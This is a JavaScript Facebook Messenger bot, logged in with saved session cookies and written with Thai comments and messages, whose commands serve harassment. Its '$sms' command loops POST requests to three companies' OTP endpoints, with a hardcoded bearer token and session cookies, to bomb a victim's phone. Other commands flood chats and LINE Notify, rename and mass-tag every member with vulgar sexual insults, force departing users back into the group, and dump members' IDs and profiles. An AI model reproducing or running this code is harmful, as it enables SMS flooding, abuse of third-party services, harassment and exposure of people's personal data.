const fs = require("fs");
const login = require("fb-chat-api");
const axios = require('axios');
const request = require("request");
const sleep = require("system-sleep");
var x = require('string.prototype.startswith');
const { exec } = require("child_process");

process.argv[0] == "node"
process.argv[1] == "botxx.js"
process.argv[2] == "user"

if (process.argv[0] || process.argv[1] || process.argv[2]) {
console.log ("LOGID : ",process.argv[2])
}

login({ appState: JSON.parse(fs.readFileSync('cookie9.json','utf8')) }, (err, api) => {
  if (err) return console.error(err);
  api.setOptions({listenEvents: true})
  api.listen((err, message) => {
    if (err) return console.error(err);
//เวลาเเก้ 23 day พ.ค 2022 (by.sayser) [ nodejs ]
switch(message.type) {
    case "event":
try {
    console.log (message.logMessageData["leftParticipantFbId"])
    api.addUserToGroup(message.logMessageData["leftParticipantFbId"], message.threadID)
    api.sendMessage({
                body:'เค้ารักเธอนะอย่าหนีเลยเดะโดนเย็ดตูดนะเด็กดื้อ @เด็กดื้อ',
                mentions: [{
                     tag: '@เด็กดื้อ',
                     id: message.logMessageData["leftParticipantFbId"],
                     fromIndex: 9,
                }],
            }, message.threadID);
}
catch(err) {
console.log("ERROR")
}
     case "message":
     console.log(message)
     var logid = ["ถ้าจะใช้ต้องมาเซ้กกับอ้าย","กูไม่ให้มึงใช้อีดอก","ต้องรักในหลวงก่อนอ้าย","มาเซ้กกับอ้ายก่อน"]
     var textid = logid[Math.floor(Math.random()*logid.length)]
     var iduser = process.argv[2]
     if (message.senderID != iduser) {
     if (message.body.startsWith("$")) {
        api.setMessageReaction("\uD83D\uDE20", message.messageID);
        api.sendMessage(textid,message.threadID)
        break
    } //idyour
  }
case "message":
//help
if (message.body === "$help") {
    api.setMessageReaction("\uD83D\uDE0D", message.messageID);
    api.sendMessage("»»———☛command☚———««​\n╰┈➤​ $help\n╰┈➤ $sms\n╰┈➤ $spemline\n╰┈➤ $spemfb\n╰┈➤ $covid\n╰┈➤ $name\n╰┈➤ $emoji\n ╰┈➤ $idme \n ╰┈➤ $userid \n ╰┈➤ $adminid \n ╰┈➤ $spamxname (admin) \n ╰┈➤ $autofb \n ╰┈➤ $group \n ╰┈➤ $spemuser \n ╰┈➤ $idyou \n ╰┈➤ $thai \n ╰┈➤ $autoname \n ╚═══((bot sayser))​═══╝\n ╚═•{šàyšêř&AKuma}•═╝", message.threadID);
    console.log("- help")
}

//thai

if (message.body.startsWith("$thai")) {
var thai = message.body.split(" ");
if (thai[1] === undefined) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$thai <messanger>",message.threadID)
   console.log(" - thai")
   break
 }
if (thai[1] === undefined || thai[2] === undefined) {
   var thaidict = require("thaidict");
   thaidict.init(function(){
    thaidict.search(thai[1],function(result){
try {
     console.log(result[0]["result"]);
     api.sendMessage("BOT SAYSET \n > เเปลภาษา \n - "+thai[1]+" \n > คําเเปล \n - "+result[0]["result"],message.threadID)
}
catch(err) {
     api.setMessageReaction("\uD83D\uDE20", message.messageID);
     console.log("ไม่มีความหมาย - "+thai[1])
     api.sendMessage("ไม่รู้ความหมายของ "+thai[1],message.threadID)
}
  });
});
}};

//sms
if (message.body.startsWith("$sms")) {
var sms = message.body.split(" ");
if (sms[1] === undefined) {
   api.sendMessage("$sms <namber> <num> \n > namber/เบอร์ \n > num/จํานวน",message.threadID)
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log (" - sms")
}
if (sms[1] === undefined || sms[2] === undefined || sms[3] === undefined) {
if (sms[1] > 9999999999) {
    api.sendMessage("กรุณาใส่เบอร์ 10หลัก \n > ตัวอย่าง 080-289-0xxx",message.threadID)
}
if (sms[2] > 51) {
   api.setMessageReaction("\uD83D\uDE20", message.messageID);
   api.sendMessage("กรุณาใส่จํานวนตํ่ากว่า 50",message.threadID)
}
if (sms[1] < 9999999999) {
if (sms[2] < 51) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log (sms[1],sms[2])
   api.sendMessage("กําลังโจมตี BOT SAYSER \n> เบอร์ : "+sms[1]+"\n> จํานวน : "+sms[2],message.threadID)
   for (var i = 0; i<sms[2]; i++) {
       axios.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.663", json={
  "lang": "th",
  "userType": "BUYER",
  "locale": "th",
  "orgIdfier": "scg",
  "phone": sms[1],
  "type": "signup",
  "otpTemplate": "buyer_signup_otp_message",
  "userParams": {
    "buyerName": "ibteesam"
  }
}, headers={"authorization":"Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..EjlRCeeVlwEMnAap7RD7_w.gmsXchvWAkPnGbtnfH4VS2m_awxyMcelD4wsmOuxNF1_BqS72z370qCxeNNsR-P2wsK_6qUNJ0ek4iSUPuTwV31WvXurXdzCBBF4iXIIOkNlHj-vka8Sy8zjin_E0CRurTFv8tsF6mpeYTA9lO3cxQ.hVTKUbtouY4LMpxVRXVpMw", "content-type": "application/json"})
        axios.post("https://topping.truemoveh.com/api/get_request_otp", data="mobile_number="+sms[1],headers={
        "Accept": "application/json, text/plain, /",
        "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
        "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
       axios.post("https://kaspy.com/sms/sms.php/",data="phone="+sms[1],headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
       console.log ("sms - ",sms[1],sms[2],i)}
   }
  }
 }
}

//spamline
if (message.body.startsWith("$spemline")) {
var line = message.body.split(" ");
if (line[1] === undefined) {
   api.sendMessage("$spemline ->\n > token/โทเค่น \n > messanger/ข้อความ \n > num/จํานวน \n  \n ข้อเเนะนํา  \n - token หาจาก line notify \n \n วิธีใช้ \n $spamline token messsanger num \n $spamline โทเค่น ข้อความ จํานวน",message.threadID)
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log(" - spemline")
   break
}
if (line[3] > 51) {
   api.setMessageReaction("\uD83D\uDE20", message.messageID);
   api.sendMessage("กรุณาใส่จํานวนตํ่ากว่า 50",message.threadID)
   break
}
console.log (line[1],line[2],line[3])
if (line[1] === undefined || line[2] === undefined || line[3] === undefined || line[4] === undefined) {
if (line[3] < 51) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("กําลังโจมตี BOT SAYSER \n > โทเค่น : "+line[1]+"\n > ข้อความ : "+line[2]+"\n > จํานวน : "+line[3],message.threadID)
    for (var i = 0; i<line[3]; i++) {
        console.log (i)
         const urlline = "https://notify-api.line.me/api/notify";
         request({method: 'POST',url: urlline,header: {'Content-Type': 'multipart/form-data',},auth: {bearer: line[1],},form: {message: line[2]}});
       }
     }
   }
}

//spemfb

if (message.body.startsWith("$spemfb")) {
var fb = message.body.split(" ");
if (fb[1] === undefined) {
   console.log (" - spemfb ")
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$spamfb <messanger> <num> \n > messanger/ข้อความ \n > num/จํานวน",message.threadID)
}
if (fb[2] > 51) {
   api.setMessageReaction("\uD83D\uDE20", message.messageID);
   api.sendMessage("กรุณาใส่จํานวนตํ่ากว่า 50",message.threadID)
}
if (fb[1] === undefined || fb[2] === undefined || fb[3] === undefined) {
if (fb[2] < 51) {
    api.sendMessage("กําลังโจมตี BOT SAYSER \n> ข้อความ : "+fb[1]+"\n> จํานวน : "+fb[2],message.threadID)
    for (var i = 0; i<fb[2]; i++){
         sleep(1000)
         api.sendMessage(" "+fb[1],message.threadID)
         console.log (fb[1],fb[2])
   }
  }
 }
}

//name
if (message.body.startsWith("$name")) { 
var name = message.body.split(" ");
if (name[1] === undefined) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$name <add> <name>\n > add/เเท็ก \n > name/ชื่อ \n",message.threadID)
   console.log("- name")
   break
}
if (name[1] === undefined || name[2] === undefined || name[3] === undefined || name[4] === undefined) {
   console.log(message)
   var x = message["mentions"]
   var lol = Object.keys(x);
   console.log(lol[0])
   api.changeNickname(" "+name[2], message.threadID, lol[0])
   console.log (name[1],name[2])
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("BOT SAYSER \n ชื่อ : "+name[3]+"\n ไอดีผู้ใช้ : "+lol[0]+"\n กําลังเปลี่ยน ถ้าไม่ติดกรุณาเช็คidผู้ใช้",message.threadID)
   console.log (" - name ")
   break
}
if (name[1] === undefined || name[2] === undefined || name[3] === undefined || name[4] === undefined || name[5] === undefined) {
   console.log(message)
   var x = message["mentions"]
   var lol = Object.keys(x);
   console.log(lol[0])
   api.changeNickname(" "+name[4], message.threadID, lol[0])
   console.log (name[1],name[4])
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("BOT SAYSER \n ชื่อ : "+name[4]+"\n ไอดีผู้ใช้ : "+lol[0]+"\n กําลังเปลี่ยน ถ้าไม่ติดกรุณาเช็คidผู้ใช้",message.threadID)
   console.log ("- name ")
   break
 }
}

//emoji
if (message.body.startsWith("$emoji")) {
var emoji = message.body.split(" ");
if (emoji[1] === undefined) {
   console.log(" - emoji")
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$emoji <emoji> \n > emoji/อีโมจิ",message.threadID)
   break
}
if (emoji[1] === undefined || emoji[2] === undefined) {
   api.changeThreadEmoji(emoji[1], message.threadID)
 }
}

//idme
if (message.body.startsWith("$idme")) {
var idx = message.body.split(" ");
if (idx[1] === undefined) {
    console.log (" - idme")
    api.getThreadInfo(message.threadID,(err,info)=>{
    if (err) console.error(err)
       console.log(info)
       console.log(info.adminIDs)
       api.setMessageReaction("\uD83D\uDE0D", message.messageID);
       api.sendMessage("BOT SAYSER \n > id :"+message.senderID,message.threadID)
  })
 }
}

//userid [ id ทุกคน ]
if (message.body === "$userid") {
   console.log (" - userid")
   api.getThreadInfo(message.threadID,(err,info)=>{
   if (err) console.error(err)
      console.log(info)
      console.log(info.adminIDs)
      api.setMessageReaction("\uD83D\uDE0D", message.messageID);
      var kingx = info.userInfo
      for (var i = 0; i < kingx.length; i++) {
          api.sendMessage("ข้อมูล user ของ "+info.userInfo[i]['firstName']+" \n id > "+info.participantIDs[i]+"\n name > "+info.userInfo[i]['name']+"\n firstName > "+info.userInfo[i]['firstName']+"\n vanity : www.facebook.com/"+info.userInfo[i]['vanity'],message.threadID)
          sleep(50)
          console.log ("start userid")
   }
  }
 )
}

//adminid [ id ของเเอดมินทั้งหมด ]
if (message.body === "$adminid") {
   console.log (" - adminid")
   api.getThreadInfo(message.threadID,(err,info)=>{
   if (err) console.error(err)
      console.log(info)
      console.log(info.adminIDs)
      api.setMessageReaction("\uD83D\uDE0D", message.messageID);
      var kingx = info.userInfo
      for (var i = 0; i < kingx.length; i++) {
          api.sendMessage("ข้อมูลadmin \n id > "+info.adminIDs[i]['id'],message.threadID)
          sleep(50)
          console.log (" - adminid")
      }
    }
  )
}


//group ข้อมูลกลุ่ม (group)
if (message.body === "$group") {
   console.log ("group")
   api.getThreadInfo(message.threadID,(err,info)=>{
   if (err) console.error(err)
      console.log(info)
      console.log(info.adminIDs)
      api.setMessageReaction("\uD83D\uDE0D", message.messageID);
      var kingx = info.userInfo
      api.sendMessage("ข้อมูลของกลุ่ม "+info.threadName+" \n id > "+info.threadID+" \n name > "+info.threadName+" \n emoji > "+info.emoji+" \n messanger > "+info.messageCount+"\n color > "+info.color,message.threadID);
      sleep(50)
      console.log (" - group")
    }
  )
 }

//spamxname ตั้งชื่อเป็นsayserทั้งหมด
if (message.body === "$spamxname") {
console.log (" - spamxname (admin)")
api.getThreadInfo(message.threadID,(err,info)=>{
if (err) console.error(err)
console.log(info)
api.setMessageReaction("\uD83D\uDE0D", message.messageID);
var kingx = info.userInfo
for (var i = 0; i < kingx.length; i++) {
sleep(50)
console.log (info.participantIDs[i])
api.changeNickname("šáyšěr-EES", message.threadID, info.participantIDs[i])
   }
  }
 )
}

//autoname
if (message.body.startsWith("$autoname")) {
var namezux = message.body.split(" ");
if (namezux[1] === undefined) {
   api.sendMessage("$autoname <name> \n > name/ชื่อ",message.threadID)
   break
}
if (namezux[1] === undefined || namezux[2] === undefined || namezux[3] === undefined) {
    api.getThreadInfo(message.threadID,(err,info)=>{
    if (err) console.error(err)
        console.log(info)
        api.setMessageReaction("\uD83D\uDE0D", message.messageID);
        var kingx = info.userInfo
        for (var i = 0; i < kingx.length; i++) {
            sleep(50)
            console.log (info.participantIDs[i])
            api.changeNickname(namezux[1], message.threadID, info.participantIDs[i])
        }
      }
    )
  }
}

//auto เเท็กทั้งกลุ่ม
if (message.body === "$autofb") {
api.getThreadInfo(message.threadID,(err,info)=>{
if (err) console.error(err)
api.setMessageReaction("\uD83D\uDE0D", message.messageID);
var yx = info.userInfo
for (var i = 0; i < yx.length; i++) {
sleep(350)
console.log ("\n"+info.userInfo[i]['name'],i)
api.sendMessage({
                body:'เด็กเหี้ย @'+info.userInfo[i]['name'],
                mentions: [{
                     tag: '@'+info.userInfo[i]['name'],
                     id: info.participantIDs[i],
                     fromIndex: 9,
                }],
            }, message.threadID);
   }
  }
 )
}

//spemuser
if (message.body.startsWith("$spemuser")) {
var add = message.body.split(" ");
if (add[1] === undefined) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$spemuser <add> <messanger> <num> \n > add/เเท็ก \n > num/จํานวน",message.threadID);
   break
}

if (add[3] > 51) {
   api.setMessageReaction("\uD83D\uDE20", message.messageID);
   api.sendMessage("กรุณาใส่จํานวนตํ่ากว่า 50",message.threadID)
}

if (add[1] === undefined || add[2] === undefined || add[3] === undefined || add[4] === undefined) {
if (add[3] < 51) {
   api.getThreadInfo(message.threadID,(err,info)=>{
   if (err) console.error(err)
   console.log (message)
   var x = message["mentions"]
   var lol = Object.keys(x);
   console.log(lol[0])
   console.log (add[1],add[2],add[3])
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   for (var i = 0; i < add[3]; i++) {
       sleep(450)
       api.sendMessage({
                body:'ไอเด็กเหี้ยเดะมึงโดนเย็ดตูด '+add[1],
                mentions: [{
                     tag: ''+add[1],
                     id: lol[0],
                     fromIndex: 9,
                }],
            }, message.threadID);

           }
         }
       )
     }
   }
 }

//idyou ไอดีคนอื่น
if (message.body.startsWith("$idyou")) {
var id = message.body.split(" ");
if (id[1] === undefined) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage("$idyou <add> \n > add/เเท็ก",message.threadID)
   break
}
if (id[1] === undefined || id[2] === undefined || id[3] === undefined) {
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   console.log (message)
   var x = message["mentions"]
   var lol = Object.keys(x);
   console.log(lol[0])
   api.sendMessage({
                body:'idผู้ใช้ของ '+id[1]+'\n > id : '+lol[0],
                mentions: [{
                     tag: ''+id[1],
                     id: lol[0],
                     fromIndex: 9,
                }],
            }, message.threadID);
    }
  }

//covid [ เชคประชากรคนเกี่ยวกับโควิด ]
if (message.body.startsWith("$covid")) {
var covid = message.body.split(" ");
if (covid[1] === undefined) {
   console.log(" - covid")
   axios.get('https://covid19.ddc.moph.go.th/api/Cases/today-cases-all/').then(response => {
   console.log(response['data'][0]['txn_date']);
   api.setMessageReaction("\uD83D\uDE0D", message.messageID);
   api.sendMessage(">     BOT SAYSER    <\n - เช็คคนสถานะการโควิด - \n > ประเทศ : ไทย \n > จํานวนผู้ติดเชื้อ : "+response['data'][0]['new_case']+"\n > รักษาหาย : "+response['data'][0]['new_recovered']+"\n > จํานวนคนตายห่า : "+response['data'][0]['new_death']+"\n > เวลาอัพเดท < \n"+response['data'][0]['update_date'],message.threadID)
    }
   )
  }
 }
} //startswith


});
});


process.on('uncaughtException', function 
(err) {
});
process.on('unhandledRejection', function 
(err) {
});
